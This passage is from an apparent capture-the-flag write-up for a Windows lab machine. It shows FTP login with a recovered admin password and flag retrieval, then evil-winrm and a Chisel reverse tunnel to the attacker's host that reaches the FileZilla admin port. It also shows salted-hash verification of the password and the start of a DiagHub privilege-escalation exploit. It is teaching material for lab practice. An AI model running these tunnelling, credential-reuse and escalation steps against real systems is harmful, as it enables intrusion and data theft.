<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@6274ae97a895:~$ ftp -p 10.10.10.158
Connected to 10.10.10.158.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse <span style="color:#ff79c6">(</span>tim.kosse@filezilla-project.org<span style="color:#ff79c6">)</span>
<span style="color:#bd93f9">220</span> Please visit https://filezilla-project.org/
Name <span style="color:#ff79c6">(</span>10.10.10.158:ctf<span style="color:#ff79c6">)</span>: superadmin
<span style="color:#bd93f9">331</span> Password required <span style="color:#ff79c6">for</span> superadmin
Password:
<span style="color:#bd93f9">230</span> Logged on
Remote system <span style="color:#8be9fd;font-style:italic">type</span> is UNIX.
ftp&gt; <span style="color:#8be9fd;font-style:italic">cd</span> Desktop
<span style="color:#bd93f9">250</span> CWD successful. <span style="color:#f1fa8c">&#34;/Desktop&#34;</span> is current directory.
ftp&gt; ls
<span style="color:#bd93f9">227</span> Entering Passive Mode <span style="color:#ff79c6">(</span>10,10,10,158,217,165<span style="color:#ff79c6">)</span>
<span style="color:#bd93f9">150</span> Opening data channel <span style="color:#ff79c6">for</span> directory listing of <span style="color:#f1fa8c">&#34;/Desktop&#34;</span>
-r--r--r-- <span style="color:#bd93f9">1</span> ftp ftp            <span style="color:#bd93f9">282</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> desktop.ini
-r--r--r-- <span style="color:#bd93f9">1</span> ftp ftp             <span style="color:#bd93f9">32</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> root.txt
<span style="color:#bd93f9">226</span> Successfully transferred <span style="color:#f1fa8c">&#34;/Desktop&#34;</span>
ftp&gt; get root.txt
local: root.txt remote: root.txt
<span style="color:#bd93f9">227</span> Entering Passive Mode <span style="color:#ff79c6">(</span>10,10,10,158,228,110<span style="color:#ff79c6">)</span>
<span style="color:#bd93f9">150</span> Opening data channel <span style="color:#ff79c6">for</span> file download from server of <span style="color:#f1fa8c">&#34;/Desktop/root.txt&#34;</span>
<span style="color:#bd93f9">226</span> Successfully transferred <span style="color:#f1fa8c">&#34;/Desktop/root.txt&#34;</span>
<span style="color:#bd93f9">32</span> bytes received in 0.00 secs <span style="color:#ff79c6">(</span>39.8597 kB/s<span style="color:#ff79c6">)</span>
ftp&gt; bye
<span style="color:#bd93f9">221</span> Goodbye
ctf@6274ae97a895:~$ cat root.txt
3cc85d1bed2ee84af4074101b991d441
</code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s install evil-winrm to remote connect our windows box from linux</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt-get install ruby-dev
sudo gem install winrm winrm-fs stringio
git clone https://github.com/Hackplayers/evil-winrm.git
./evil-winrm.rb -i 10.10.10.158 -u superadmin -p funnyhtb
</code></pre></td></tr></table>
</div>
</div><h2 id="tunneling-on-windows-with-chisel">Tunneling on Windows with Chisel</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@6274ae97a895:~/json/www/json$ cat FileZilla_Server.xml | grep -i <span style="color:#f1fa8c">&#34;admin port&#34;</span>
        &lt;Item <span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Admin port&#34;</span> <span style="color:#8be9fd;font-style:italic">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;numeric&#34;</span>&gt;14147&lt;/Item&gt;
</code></pre></td></tr></table>
</div>
</div><p>Download Chisel</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone https://github.com/jpillora/chisel
<span style="color:#8be9fd;font-style:italic">cd</span> chisel
go build
cp .<span style="color:#f1fa8c">\c</span>hisel.exe ../../../Desktop/share/
</code></pre></td></tr></table>
</div>
</div><p>The FileZilla Server interface.exe is a windows binary so we will use our Commando VM to spawn a shell from the remote machine.
Once the Shell is obtained, we can start the chisel server on port 9000</p>
<pre tabindex="0"><code>PS C:\Users\User\Documents\github\chisel &gt; ./chisel.exe server --host 192.168.99.104 --port 9000 --reverse
</code></pre><p>Then we can port forward on client side:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\M</span>usic&gt; ./chisel client 10.10.14.149:9000 R:14147:127.0.0.1:14147
2020/02/19 12:20:50 client: Connecting to ws://10.10.14.149:9000
2020/02/19 12:20:51 client: Fingerprint 26:4c:e5:bd:cc:60:be:d2:3c:37:9a:d5:9e:b2:4d:37
2020/02/19 12:20:53 client: server: server: proxy#1:R:0.0.0.0:14147<span style="color:#ff79c6">=</span>&gt;127.0.0.1:14147: listen tcp4 0.0.0.0:14147: bind: Only one usage of each socket address <span style="color:#ff79c6">(</span>protocol/network address/port<span style="color:#ff79c6">)</span> is normally permitted.
PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\M</span>usic&gt;
</code></pre></td></tr></table>
</div>
</div><p>On server side we can see as well the connection is established and the port listening on port 14147</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\U</span>ser<span style="color:#f1fa8c">\D</span>esktop<span style="color:#f1fa8c">\s</span>hare &gt; ./chisel.exe server --host 0.0.0.0 --port <span style="color:#bd93f9">9000</span> --reverse
2020/02/19 05:18:20 server: Reverse tunnelling enabled
2020/02/19 05:18:20 server: Fingerprint 26:4c:e5:bd:cc:60:be:d2:3c:37:9a:d5:9e:b2:4d:37
2020/02/19 05:18:20 server: Listening on 0.0.0.0:9000...
2020/02/19 05:18:41 server: proxy#1:R:0.0.0.0:14147<span style="color:#ff79c6">=</span>&gt;127.0.0.1:14147: Listening
</code></pre></td></tr></table>
</div>
</div><p>Indeed netstat shows the port is listening</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\U</span>ser<span style="color:#f1fa8c">\D</span>ocuments<span style="color:#f1fa8c">\g</span>ithub<span style="color:#f1fa8c">\c</span>hisel &gt; netstat -an | findstr <span style="color:#bd93f9">141</span>
  TCP    0.0.0.0:14147          0.0.0.0:0              LISTENING
  TCP    127.0.0.1:1045         127.0.0.1:14147        ESTABLISHED
  TCP    127.0.0.1:14147        127.0.0.1:1045         ESTABLISHED
</code></pre></td></tr></table>
</div>
</div><p>We download FileZilla Server.exe with Firefox, and we connect it locally to the port 14147.
We are now able to create a new dummy user &lsquo;dummy&rsquo; and give him write permissions on a new share folder pointing at &lsquo;C:'.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@6274ae97a895:~ $ ftp -p 10.10.10.158
Connected to 10.10.10.158.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse <span style="color:#ff79c6">(</span>tim.kosse@filezilla-project.org<span style="color:#ff79c6">)</span>
<span style="color:#bd93f9">220</span> Please visit https://filezilla-project.org/
Name <span style="color:#ff79c6">(</span>10.10.10.158:ctf<span style="color:#ff79c6">)</span>: qwerty
<span style="color:#bd93f9">331</span> Password required <span style="color:#ff79c6">for</span> qwerty
Password:
<span style="color:#bd93f9">230</span> Logged on
Remote system <span style="color:#8be9fd;font-style:italic">type</span> is UNIX.
ftp&gt; <span style="color:#8be9fd;font-style:italic">cd</span> Users
<span style="color:#bd93f9">250</span> CWD successful. <span style="color:#f1fa8c">&#34;/Users&#34;</span> is current directory.
ftp&gt; <span style="color:#8be9fd;font-style:italic">cd</span> userpool
<span style="color:#bd93f9">250</span> CWD successful. <span style="color:#f1fa8c">&#34;/Users/userpool&#34;</span> is current directory.
ftp&gt; <span style="color:#8be9fd;font-style:italic">cd</span> ..
<span style="color:#bd93f9">250</span> CWD successful. <span style="color:#f1fa8c">&#34;/Users&#34;</span> is current directory.
ftp&gt; <span style="color:#8be9fd;font-style:italic">cd</span> superadmin
<span style="color:#bd93f9">250</span> CWD successful. <span style="color:#f1fa8c">&#34;/Users/superadmin&#34;</span> is current directory.
ftp&gt; <span style="color:#8be9fd;font-style:italic">cd</span> Desktop
<span style="color:#bd93f9">250</span> CWD successful. <span style="color:#f1fa8c">&#34;/Users/superadmin/Desktop&#34;</span> is current directory.
ftp&gt; ls
<span style="color:#bd93f9">227</span> Entering Passive Mode <span style="color:#ff79c6">(</span>10,10,10,158,254,76<span style="color:#ff79c6">)</span>
<span style="color:#bd93f9">150</span> Opening data channel <span style="color:#ff79c6">for</span> directory listing of <span style="color:#f1fa8c">&#34;/Users/superadmin/Desktop&#34;</span>
-r--r--r-- <span style="color:#bd93f9">1</span> ftp ftp            <span style="color:#bd93f9">282</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> desktop.ini
-r--r--r-- <span style="color:#bd93f9">1</span> ftp ftp             <span style="color:#bd93f9">32</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> root.txt
<span style="color:#bd93f9">226</span> Successfully transferred <span style="color:#f1fa8c">&#34;/Users/superadmin/Desktop&#34;</span>
ftp&gt; get root.txt
local: root.txt remote: root.txt
<span style="color:#bd93f9">227</span> Entering Passive Mode <span style="color:#ff79c6">(</span>10,10,10,158,203,179<span style="color:#ff79c6">)</span>
<span style="color:#bd93f9">150</span> Opening data channel <span style="color:#ff79c6">for</span> file download from server of <span style="color:#f1fa8c">&#34;/Users/superadmin/Desktop/root.txt&#34;</span>
<span style="color:#bd93f9">226</span> Successfully transferred <span style="color:#f1fa8c">&#34;/Users/superadmin/Desktop/root.txt&#34;</span>
<span style="color:#bd93f9">32</span> bytes received in 0.00 secs <span style="color:#ff79c6">(</span>395.5696 kB/s<span style="color:#ff79c6">)</span>
ftp&gt;
</code></pre></td></tr></table>
</div>
</div><p>The flag is finally obtained ;)</p>
<p>We can now clean by deleting some binaries.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\M</span>usic&gt; tasklist | findstr chisel
chisel.exe                    <span style="color:#bd93f9">2508</span>                            <span style="color:#bd93f9">0</span>      6,764 K
PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\M</span>usic&gt; taskkill /f /pid <span style="color:#bd93f9">2508</span>
SUCCESS: The process with PID <span style="color:#bd93f9">2508</span> has been terminated.
</code></pre></td></tr></table>
</div>
</div><h2 id="attempt-to-decrypt-password-from-filezilla-config-file">Attempt to decrypt password from FileZilla config file</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@6274ae97a895:~/json/www/json$ cat FileZilla_Server.xml
            &lt;Option <span style="color:#8be9fd;font-style:italic">Name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Pass&#34;</span>&gt;813CCFB086CB6C9046F13F1E10D5222ECB63E11A809C133580577B5597D28EB079F6DDD5AA52D1503BED569C72B589F165FC02993C51E0994A6290A0356EC2A0&lt;/Option&gt;
            &lt;Option <span style="color:#8be9fd;font-style:italic">Name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Salt&#34;</span>&gt;cwl.PD<span style="color:#ff79c6">(</span>Zw&amp;lt;EA-@&amp;gt;ux6z,<span style="color:#ff79c6">]</span>l5U7<span style="color:#ff79c6">]</span><span style="color:#8be9fd;font-style:italic">$Cr</span>@cW?aD4~:j4&amp;quot;%_*<span style="color:#f1fa8c">\6</span>k&amp;quot;Uk<span style="color:#ff79c6">{</span>1k@P7IX<span style="color:#f1fa8c">`</span>.K7v0&lt;/Option&gt;
</code></pre></td></tr></table>
</div>
</div><p>Usually we obtain the Password hash by concataining the password with the salt before hashing: <code>salt = hashfunction(pwd + salt)</code></p>
<p>We have to decode htmlentities (ie &lt; &hellip;) back in unicode character.
I used python but have suffer bug as it converted two character &lsquo;\6&rsquo; into a byte &lsquo;\x06&rsquo;, which affects the salt</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> html
html<span style="color:#ff79c6">.</span>unescape(<span style="color:#f1fa8c">&#39;cwl.PD(Zw&amp;lt;EA-@&amp;gt;ux6z,]l5U7]$Cr@cW?aD4~:j4&amp;quot;%_*</span><span style="color:#f1fa8c">\6</span><span style="color:#f1fa8c">k&amp;quot;Uk{1k@P7IX`.K7v0&#39;</span>)
<span style="color:#f1fa8c">&#39;cwl.PD(Zw&lt;EA-@&gt;ux6z,]l5U7]$Cr@cW?aD4~:j4&#34;%_*</span><span style="color:#f1fa8c">\x06</span><span style="color:#f1fa8c">k&#34;Uk{1k@P7IX`.K7v0&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>We manually fix the salt so that it looks like</p>
<pre tabindex="0"><code>'cwl.PD(Zw&lt;EA-@&gt;ux6z,]l5U7]$Cr@cW?aD4~:j4&quot;%_*\x06k&quot;Uk{1k@P7IX`.K7v0'
</code></pre><p>We can now calculate the password hash:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@6274ae97a895:~/json/www/json$ <span style="color:#8be9fd;font-style:italic">echo</span> -n <span style="color:#f1fa8c">&#39;funnyhtbcwl.PD(Zw&lt;EA-@&gt;ux6z,]l5U7]$Cr@cW?aD4~:j4&#34;%_*\6k&#34;Uk{1k@P7IX`.K7v0&#39;</span> |sha512sum
813ccfb086cb6c9046f13f1e10d5222ecb63e11a809c133580577b5597d28eb079f6ddd5aa52d1503bed569c72b589f165fc02993c51e0994a6290a0356ec2a0  -
</code></pre></td></tr></table>
</div>
</div><p>Which</p>
<h2 id="diaghub-exploit-attempt-to-elevate-privileges-by-using-login-and-password">DiagHub exploit: Attempt to elevate privileges by using login and password</h2>
<p>We first fail to get the Shell because superadmin ftp password &lsquo;funnyhtb&rsquo; is not the user account password</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">PS </span>C:\windows\system32\inetsrv&gt;<span style="color:#8be9fd;font-style:italic">PS </span>C:\windows\system32\inetsrv&gt;
<span style="color:#8be9fd;font-style:italic">PS </span>C:\windows\system32\inetsrv&gt; <span style="color:#8be9fd;font-style:italic">$pass</span> = <span style="color:#8be9fd;font-style:italic">convertto-securestring</span> <span style="color:#f1fa8c">&#39;funnyhtb&#39;</span> -asplain -force
<span style="color:#8be9fd;font-style:italic">PS </span>C:\windows\system32\inetsrv&gt; <span style="color:#8be9fd;font-style:italic">$cred</span> = <span style="color:#8be9fd;font-style:italic">new-object</span> system.management.automation.pscredential(<span style="color:#f1fa8c">&#39;.\superadmin&#39;</span>, <span style="color:#8be9fd;font-style:italic">$pass</span>)
<span style="color:#8be9fd;font-style:italic">PS </span>C:\windows\system32\inetsrv&gt; <span style="color:#8be9fd;font-style:italic">invoke-command</span> -computer json -credential <span style="color:#8be9fd;font-style:italic">$cred</span> -scriptblock {whoami}
<span style="color:#8be9fd;font-style:italic">PS </span>C:\windows\system32\inetsrv&gt; [json] Connecting to remote server json failed with the following error
message : Access is denied. <span style="color:#ff79c6">For</span> more information, see the
about_Remote_Troubleshooting Help topic.
    + CategoryInfo          : OpenError: (json:String) [], PSRemotingTransport
   Exception
    + FullyQualifiedErrorId : AccessDenied,PSSessionStateBroken
</code></pre></td></tr></table>
</div>
</div><p>we will use the <a href="https://github.com/decoder-it/diaghub_exploit">Diaghub</a> technique to get a Shell.</p>
<ol>
<li>First we download the git project on CommandoVM, then open the solution in Visual Studio.</li>
<li>We edit FakeDll.cpp with a writeable path <code>C:\\tmp\\r.bat</code></li>
<li>We do the same in diaghub_exploit.cpp on top of LoadDll function</li>
<li>Change to Release</li>
<li>Build Solution</li>
